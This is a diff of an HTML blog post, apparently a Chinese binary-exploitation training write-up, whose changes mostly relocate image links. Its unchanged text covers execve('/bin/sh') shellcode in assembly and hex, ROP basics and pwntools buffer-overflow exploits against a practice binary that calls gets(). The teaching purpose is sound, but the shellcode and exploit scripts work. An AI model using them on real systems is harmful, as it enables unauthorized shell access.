@@ -19,23 +19,23 @@
 <meta property="og:site_name" content="AssassinQ">
 <meta property="og:description" content="Shellcode’s Magic&amp;amp;Basic ROP.">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6h3amd45ovklnpp15bb1kra.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6h997lpa51fb37e1qtp1ruma.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6hrrhi1damkc41opd13n63ksa.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6ljipfl6l3ktda0r0c1g06a.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6llcnk1c54v8615f815u14tia.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6hjjm98kj1631nmvt0u1d6va.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6ou0t1128h1s9v6akqqb16jda.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6pboj411ei93s13dn18849jsa.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6phguk1it76q285910npuhma.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci6ppapm1jfn17oc144i1ad6pgda.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci7bvvg81rlp14js84cthk1rl5a.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ci7crlsb1rdl1efmbdmi22113ra.png-j.jpg">
-<meta property="og:updated_time" content="2018-07-12T14:42:55.395Z">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/1.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/2.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/3.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/4.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/5.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/6.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/7.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/8.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/9.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/10.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/11.png">
+<meta property="og:image" content="http://assassinq.com/pics/BIN集训/六/12.png">
+<meta property="og:updated_time" content="2018-10-06T11:40:35.508Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BIN集训（六）">
 <meta name="twitter:description" content="Shellcode’s Magic&amp;amp;Basic ROP.">
-<meta name="twitter:image" content="http://t1.aixinxi.net/o_1ci6h3amd45ovklnpp15bb1kra.png-j.jpg">
+<meta name="twitter:image" content="http://assassinq.com/pics/BIN集训/六/1.png">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
   
@@ -263,25 +263,25 @@
 <h2 id="EBX中的参数（-bin-sh）"><a href="#EBX中的参数（-bin-sh）" class="headerlink" title="EBX中的参数（/bin/sh）"></a>EBX中的参数（<code>/bin/sh</code>）</h2><p>一般做法是压入栈后取ESP：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH 0x68732F2F</span><br><span class="line">PUSH 0x6E69622F</span><br><span class="line">MOV EBX,ESP</span><br></pre></td></tr></table></figure>
 <p>前两段十六进制转换成ascii码是：<code>hs//nib/</code>，取ESP的值到EBX中后，EBX的值即为：字符串<code>/bin//sh</code>的首地址。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6h3amd45ovklnpp15bb1kra.png-j.jpg" alt="转换成ascii码后"></p>
+<p><img src="/pics/BIN集训/六/1.png" alt="转换成ascii码后"></p>
 <p>PS：在多级目录下，多个斜杠是对路径没有影响的。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6h997lpa51fb37e1qtp1ruma.png-j.jpg" alt="仍然是进入/bin目录下"></p>
+<p><img src="/pics/BIN集训/六/2.png" alt="仍然是进入/bin目录下"></p>
 <h2 id="nasm反汇编工具下载"><a href="#nasm反汇编工具下载" class="headerlink" title="nasm反汇编工具下载"></a>nasm反汇编工具下载</h2><p>Netwide Assembler是一款基于英特尔x86架构的汇编与反汇编工具。它可以用来编写16位、32位（IA-32）和64位（x86-64）的程序。 NASM被认为是Linux平台上最受欢迎的汇编工具之一。</p>
 <h3 id="sudo-apt-get-install-nasm报错"><a href="#sudo-apt-get-install-nasm报错" class="headerlink" title="sudo apt-get install nasm报错"></a><code>sudo apt-get install nasm</code>报错</h3><p>记录一下无法下载时的解决方法。</p>
 <ol>
 <li>使用<code>ps -A | grep apt</code>命令来找出所有<code>apt</code>进程。</li>
 <li>使用<code>sudo kill -9 {进程编号}</code>来逐个杀死进程。</li>
 </ol>
-<p><img src="http://t1.aixinxi.net/o_1ci6hrrhi1damkc41opd13n63ksa.png-j.jpg" alt="杀死每个apt进程"></p>
+<p><img src="/pics/BIN集训/六/3.png" alt="杀死每个apt进程"></p>
 <p>结束所有进程后即可下载。</p>
 <h2 id="完整编写过程"><a href="#完整编写过程" class="headerlink" title="完整编写过程"></a>完整编写过程</h2><p>写入文件<code>shellcode.asm</code>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line">	global _start</span><br><span class="line">_start:</span><br><span class="line">	xor ecx,ecx</span><br><span class="line">	mul ecx</span><br><span class="line">	push ecx</span><br><span class="line">	push 0x68732f2f</span><br><span class="line">	push 0x6e69622f</span><br><span class="line">	mov ebx,esp</span><br><span class="line">	mov al,0xb</span><br><span class="line">	int 0x80</span><br></pre></td></tr></table></figure>
 <p>PS：关于这两条指令：<code>XOR ECX,ECX =&gt; MUL ECX</code>，经过测试，会先将ECX中的值置零，然后EAX、EDX中的值也都会变为零。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6ljipfl6l3ktda0r0c1g06a.png-j.jpg" alt="DS:IP指向的汇编指令"></p>
-<p><img src="http://t1.aixinxi.net/o_1ci6llcnk1c54v8615f815u14tia.png-j.jpg" alt="执行过程中通用寄存器中值的变化"></p>
+<p><img src="/pics/BIN集训/六/4.png" alt="DS:IP指向的汇编指令"></p>
+<p><img src="/pics/BIN集训/六/5.png" alt="执行过程中通用寄存器中值的变化"></p>
 <p>执行命令：<code>nasm -f elf shellcode.asm -o shellcode.o</code>后，使用<code>objdump</code>命令对<code>shellcode.o</code>进行反汇编：<code>objdump -d shellcode.o</code>。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6hjjm98kj1631nmvt0u1d6va.png-j.jpg" alt="反汇编后的结果"></p>
-<p>将十六进制部分记录下来，就构成了一条shellcode：“\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80”。</p>
+<p><img src="/pics/BIN集训/六/6.png" alt="反汇编后的结果"></p>
+<p>将十六进制部分记录下来，就构成了一条shellcode：<code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code>。</p>
 <h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>面向返回编程（Return-Oriented Programming）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。每一段gadget通常结束于return指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。</p>
 <h2 id="相关保护机制"><a href="#相关保护机制" class="headerlink" title="相关保护机制"></a>相关保护机制</h2><p>NX即No-eXecute（不可执行）的意思，NX（类似于windows下的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
 <p>PS：</p>
@@ -306,17 +306,17 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	srand(time(<span class="number">0</span>) ^ getpid());</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">int</span> magic = rand();</span><br><span class="line">	<span class="keyword">if</span> (atoi(buf) == magic) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Okay..."</span>);</span><br><span class="line">		system(<span class="string">"sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这道题和之前的一题很类似，但是将buf和magic两个变量的位置进行了调换，所以无法通过直接覆盖magic的值来getshell。（当然还有一种方法时直接获得<code>system(&quot;sh&quot;);</code>的地址来getshell）</p>
 <h2 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h2><p>此时ASLR是关闭的。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6ou0t1128h1s9v6akqqb16jda.png-j.jpg" alt="ASLR为0"></p>
+<p><img src="/pics/BIN集训/六/7.png" alt="ASLR为0"></p>
 <p>基本的想法是先填入shellcode，然后通过ret的偏移量来跳转到shellcode的首地址，执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>来getshell。</p>
 <p>shellcode在之前已经写好了，偏移量也可以通过之前缓冲区溢出的方法来得到。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6pboj411ei93s13dn18849jsa.png-j.jpg" alt="获取偏移量"></p>
+<p><img src="/pics/BIN集训/六/8.png" alt="获取偏移量"></p>
 <p>最后应该如何获得shellcode的首地址？可以通过如下payload来获取。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./7-11'</span>)</span><br><span class="line">raw_input() <span class="comment"># 相当于设下断点</span></span><br><span class="line">shellcode=p32(<span class="number">0xdeadbeef</span>)+<span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">addr=p32(<span class="number">0x12345678</span>)</span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line">payload=shellcode+(offset-len(shellcode))*<span class="string">'A'</span>+addr</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>这里在shellcode前加上“0xdeadbeef”，是为了之后在调试时更方便地找到首地址。<code>raw_input()</code>要求输入值，可以使程序在运行时终止，相当于一个断点。</p>
 <p>运行test.py，会得到该程序的PID，用gdb的attach命令执行它。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6phguk1it76q285910npuhma.png-j.jpg" alt="对正在运行的程序进行调试"></p>
+<p><img src="/pics/BIN集训/六/9.png" alt="对正在运行的程序进行调试"></p>
 <p>在运行程序处随便输入值，然后在gdb中用finish命令使程序执行到<code>gets()</code>函数结束，再用searchmem命令查找“0xdeadbeef”的地址，即得到shellcode的首地址。</p>
-<p><img src="http://t1.aixinxi.net/o_1ci6ppapm1jfn17oc144i1ad6pgda.png-j.jpg" alt="stack处即shellcode首地址"></p>
+<p><img src="/pics/BIN集训/六/10.png" alt="stack处即shellcode首地址"></p>
 <p>最后的exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 7-11.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./7-11'</span>)</span><br><span class="line">shellcode=<span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">addr=p32(<span class="number">0xffffcfa8</span>)</span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line"><span class="comment"># payload=shellcode+(offset-len(shellcode))*'A'+addr</span></span><br><span class="line">payload=shellcode.ljust(offset,<span class="string">'A'</span>)+addr</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="中等难度"><a href="#中等难度" class="headerlink" title="中等难度"></a>中等难度</h2><p>通过命令<code>sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>，打开ASLR。</p>
@@ -325,9 +325,9 @@
 <p>总体的思路是利用BSS段地址不变的特性，构造payload：<code>payload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)</code>（因为BSS段开头部分可能存储一些重要数据，故增加0x100来避免影响程序）。第一个BSS首地址表示<code>gets()</code>的返回地址，第二个BSS首地址表示<code>gets()</code>的参数。</p>
 <p>那么通过payload可知，程序执行时会重新返回到<code>gets()</code>函数处，调用函数时，相当于先<code>Push retaddr</code>再<code>Jump</code>，即第一个BSS首地址为函数返回地址，再输入shellcode作为函数参数，即第二个BSS首地址。</p>
 <p>使用gdb对程序调试，用vmmap命令查看bss段：</p>
-<p><img src="http://t1.aixinxi.net/o_1ci7bvvg81rlp14js84cthk1rl5a.png-j.jpg" alt="查看结果"></p>
+<p><img src="/pics/BIN集训/六/11.png" alt="查看结果"></p>
 <p>记录下bss段地址。通过<code>objdump -d</code>查看<code>gets()</code>函数地址：</p>
-<p><img src="http://t1.aixinxi.net/o_1ci7crlsb1rdl1efmbdmi22113ra.png-j.jpg" alt="gets的地址"></p>
+<p><img src="/pics/BIN集训/六/12.png" alt="gets的地址"></p>
 <p>两个地址都搞定后，那么就可以写出exp了：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote('10.21.13.88',1025)</span></span><br><span class="line">p = process(<span class="string">'./7-11'</span>)</span><br><span class="line">shellcode=<span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line">bss=<span class="number">0x0804a000</span></span><br><span class="line">gets_addr=<span class="number">0x08048400</span></span><br><span class="line">payload=offset*<span class="string">'A'</span>+p32(gets_addr)+p32(bss+<span class="number">0x100</span>)+p32(bss+<span class="number">0x100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,'''</span></span><br><span class="line"><span class="comment"># ''') //在运行脚本时可以直接打开gdb进行调试</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>感觉自己基础知识还是有很多缺陷，先把<a href="http://showlinkroom.me/2017/01/22/pwnable-tw/" target="_blank" rel="noopener">别人的wp</a>放上来，之后慢慢研究。</p>
